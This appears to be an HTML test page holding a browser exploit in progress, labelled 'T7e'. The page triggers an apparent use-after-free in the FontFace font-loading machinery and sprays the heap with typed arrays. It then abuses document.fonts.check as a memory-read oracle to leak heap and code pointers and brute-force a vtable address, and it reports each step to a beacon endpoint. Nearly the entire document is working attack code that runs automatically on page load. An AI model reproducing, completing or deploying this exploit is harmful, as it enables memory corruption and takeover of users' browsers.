<!DOCTYPE html><html><head><meta charset="utf-8"><title>T7e</title></head>
<body><pre id="O">T7e</pre>
<script>
'use strict';
function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T7e-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
bs('BOOT');
var K=1024,PF=500,SZ=192,fired=false,faces=null,AT=0;

function le48(v,o){
  return v[o]+v[o+1]*0x100+v[o+2]*0x10000+v[o+3]*0x1000000
        +v[o+4]*0x100000000+v[o+5]*0x10000000000;
}
function hex(x){return '0x'+Math.round(x).toString(16);}
function wr48(u,o,x){for(var k=0;k<6;k++){u[o+k]=x%256;x=Math.floor(x/256);}u[o+6]=0;u[o+7]=0;}
function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
function align256(x){return Math.floor(x/256)*256;}

window.__pf=[];for(var pfi=0;pfi<PF;pfi++)window.__pf.push(new Uint8Array(new ArrayBuffer(SZ)));

function start(){
  AT++;if(AT>1)return;
  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
  try{document.fonts.add(vf);}catch(e){}
  try{void vf.loaded;}catch(e){}
  var fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired)return undefined;fired=true;
    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
    try{document.body.offsetHeight;}catch(e){}
    window.__sp=[];
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SZ));
      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
      w[0x82]=3;
      w[0x38]=0x00;w[0x39]=0x10;w[0x3A]=0x00;w[0x3B]=0x00;
      w[0x3C]=0x00;w[0x3D]=0x20;w[0x3E]=0x00;w[0x3F]=0x00;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});
  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,100);},function(){});
}

function phase(){
  var bufs=[],L1=0,L2=0;
  for(var i=0;i<window.__sp.length;i++){
    var a=le48(window.__sp[i],0x58);
    if(a>0x1000000000){
      var b2=le48(window.__sp[i],0x68);
      if(L1===0){L1=a;L2=b2;}
      bufs.push([window.__sp[i],b2,i]);
    }
  }
  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
  if(!bufs.length){bs('NOLEAK');return;}
  var h0=bufs[0][0];

  for(var ib=0;ib<bufs.length;ib++){
    var vb=bufs[ib][0];
    vb[0]=2;wr48(vb,0x08,bufs[ib][1]);wr48(vb,0x10,0);vb[0x82]=0;
    wr48(vb,0x20,0);put32(vb,0x28,0);put32(vb,0x2C,0);
  }
  setTimeout(function(){
    bs('FACES='+faces.length);
    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
    setTimeout(function(){
      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
      setTimeout(function(){
        var zi=-1;
        for(var q=0;q<faces.length;q++){
          var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
          if(r===false){zi=q;break;}
        }
        bs('ZI='+zi);
        if(zi<0){bs('NOORACLE');return;}

        function setR(addr){for(var ir=0;ir<bufs.length;ir++)wr48(bufs[ir][0],0x20,addr);}
        function chk(c){try{return document.fonts.check('1em zz'+zi,String.fromCodePoint(c))===false;}catch(e){return null;}}

        for(var ip=0;ip<bufs.length;ip++){
          bufs[ip][0][0x82]=0;
          put32(bufs[ip][0],0x38,0x1000);put32(bufs[ip][0],0x3C,0x2000);
          wr48(bufs[ip][0],0x20,L2);
          bufs[ip][0][0x28]=1;bufs[ip][0][0x2C]=1;
        }

        bs('SCAN1');
        var self=0,n3=0;
        var anchors=[align256(L1),align256(L2)];
        for(var an=0;an<anchors.length&&!self;an++){
          var cS=anchors[an]-0x400000,cE=anchors[an]+0x400000;
          if(cS<0x10000)cS=0x10000;
          for(var a=cS;a<cE&&!self;a+=128){
            setR(a+0x38);n3++;
            if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
              self=a;bs('SELF='+hex(a));
            }
          }
        }
        bs('SCAN1-END-n='+n3);
        if(!self){bs('NOSELF');}

        function bsFrom(lo,hi){
          if(chk(hi)!==true)return -1;
          while(lo<hi){var mid=(lo+hi)>>>1;if(chk(mid)===true)hi=mid;else lo=mid+1;}
          return lo;
        }
        function bsTo(fr,hi){
          var lo=fr;
          while(lo<hi){var mid=(lo+hi+1)>>>1;if(chk(mid)===true)lo=mid;else hi=mid-1;}
          return lo;
        }

        // s2 read: setR(addr+2), bsFrom → bytes[2..5] as u32
        function s2(addr){setR(addr+2);return bsFrom(0,0x10FFFF);}
        // s4 read: setR(addr+4), bsFrom → bytes[4..7] as u32
        function s4(addr){setR(addr+4);return bsFrom(0,0x10FFFF);}

        // ============================================================
        // PHASE A: s2 sweep of L2 object at every 8 bytes
        // s2 from in [0x80000,0x8FFFF] = text ptr (0x08xxxxxxxx)
        // s2 from in [0x100000,0x10FFFF] = heap ptr (0x10xxxxxxxxxx)
        // s2 from = 0 = NULL qword
        // s2 from = -1 = unreadable (high byte pushes from > cap)
        // ============================================================
        bs('PH-A');
        var l2off=[-0x18,-0x10,-0x08,0x00,0x08,0x10,0x18,0x20,0x28,0x30,0x38];
        for(var j=0;j<l2off.length;j++){
          var f=s2(L2+l2off[j]);
          var tag='L2['+l2off[j].toString(16)+']=';
          if(f===-1)tag+='X';
          else if(f===0)tag+='N';
          else if(f>=0x100000&&f<=0x10FFFF)tag+='H:'+f.toString(16);
          else if(f>=0x80000&&f<=0x8FFFF)tag+='T:'+f.toString(16);
          else tag+=f.toString(16);
          bs(tag);
        }

        // ============================================================
        // PHASE B: Cross-read at L2+0x06 for WPI byte[0]
        // If *L2 = 0, then setR(L2+6) reads:
        //   from = L2[6]*1 + L2[7]*256 + WPI_b0*65536 + WPI_b1*16M
        //   L2 bytes 6,7 are zero (NULL qword), so from = WPI_b0*65536
        // ============================================================
        bs('PH-B');
        setR(L2+6);
        var crossF=bsFrom(0,0x10FFFF);
        bs('L2cross6='+( crossF>=0 ? '0x'+crossF.toString(16) : '-1'));

        // ============================================================
        // PHASE C: s4 at L2+0x20 — classify mystery pointer byte[7]
        // s3 gave 0x53103 last boot. s4 gives bytes[4..7].
        // If byte[7]=0 → from=0x531, else from too large.
        // ============================================================
        bs('PH-C');
        var s4v=s4(L2+0x20);
        bs('L2[20]s4='+(s4v>=0?'0x'+s4v.toString(16):'-1'));

        // Also read s2 at L2+0x20 for completeness
        var s2v20=s2(L2+0x20);
        bs('L2[20]s2='+(s2v20>=0?'0x'+s2v20.toString(16):'-1'));

        // ============================================================
        // PHASE D: s2 sweep of L1 object
        // ============================================================
        bs('PH-D');
        var l1off=[-0x18,-0x10,-0x08,0x00,0x08,0x10,0x18,0x20,0x28,0x30];
        for(var j2=0;j2<l1off.length;j2++){
          var f2=s2(L1+l1off[j2]);
          var tag2='L1['+l1off[j2].toString(16)+']=';
          if(f2===-1)tag2+='X';
          else if(f2===0)tag2+='N';
          else if(f2>=0x100000&&f2<=0x10FFFF)tag2+='H:'+f2.toString(16);
          else if(f2>=0x80000&&f2<=0x8FFFF)tag2+='T:'+f2.toString(16);
          else tag2+=f2.toString(16);
          bs(tag2);
        }

        // ============================================================
        // PHASE E: If any heap pointer found at L2+0x08 via s2,
        // attempt WPI→VTABLE chain.
        // Expected vtable s2 signature: 0x80000 + VT_mid_bytes
        // VT_DELTA = 0x1710B78, text_base = 0x800000000
        // VTABLE = text_base + VT_DELTA = 0x801710B78
        // s2 of VTABLE: bytes[2..5] = [0x71, 0x01, 0x08, 0x00]
        //   from = 0x71 + 0x01*256 + 0x08*65536 = 0x80171
        // ============================================================
        var wpiS2=s2(L2+0x08);
        if(wpiS2>=0x100000&&wpiS2<=0x10FFFF){
          bs('PH-E-WPI');
          var wpiMid=wpiS2-0x100000;
          var wpiB2=wpiMid%256,wpiB3=Math.floor(wpiMid/256);
          bs('WPI-b2=0x'+wpiB2.toString(16)+'-b3=0x'+wpiB3.toString(16));

          // Try cross-read for byte[0]
          setR(L2+6);
          var cr=bsFrom(0,0x10FFFF);
          var wpiB0=-1,wpiB1=-1;
          if(cr>=0){
            wpiB0=Math.floor(cr/65536);
            wpiB1=Math.floor(cr/16777216);
            bs('WPI-b0=0x'+wpiB0.toString(16)+'-b1=0x'+wpiB1.toString(16));
          }

          // If byte[0] known, construct full WPI and read vtable
          if(wpiB0>=0&&wpiB1>=0){
            var WPI=wpiB0+wpiB1*256+wpiB2*65536+wpiB3*16777216+0x10*4294967296;
            bs('WPI='+hex(WPI));
            var vtS2=s2(WPI);
            bs('VT-s2='+(vtS2>=0?'0x'+vtS2.toString(16):'-1'));
            if(vtS2>=0x80000&&vtS2<=0x8FFFF){
              bs('VT-TEXT-HIT=0x'+vtS2.toString(16));
            }
          } else {
            // Brute-force: scan 8-byte-aligned b0 candidates with vtable sig
            bs('PH-E-BRUTE');
            var VTSIG=0x80171;
            var hits=0;
            for(var b1=0;b1<256&&hits<3;b1++){
              for(var b0=0;b0<256&&hits<3;b0+=8){
                var wg=b0+b1*256+wpiB2*65536+wpiB3*16777216+0x10*4294967296;
                setR(wg+2);
                var vf2=bsFrom(0,0x10FFFF);
                if(vf2>=0x80000&&vf2<=0x8FFFF){
                  hits++;
                  bs('VT-HIT-wpi='+hex(wg)+'-vtS2=0x'+vf2.toString(16));
                  if(vf2===VTSIG){bs('VT-EXACT');}
                }
              }
            }
            bs('BRUTE-END-hits='+hits);
          }
        } else {
          bs('PH-E-SKIP-wpiS2='+(wpiS2>=0?'0x'+wpiS2.toString(16):'-1'));
        }

        // Restore oracle
        put32(h0,0x38,0x1000);put32(h0,0x3C,0x2000);
        if(self)setR(self+0x38);

        bs('DONE');
        document.getElementById('O').textContent='T7e DONE';
      },50);
    },50);
  },50);
}
if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
else document.addEventListener('DOMContentLoaded',start);
</script></body></html>
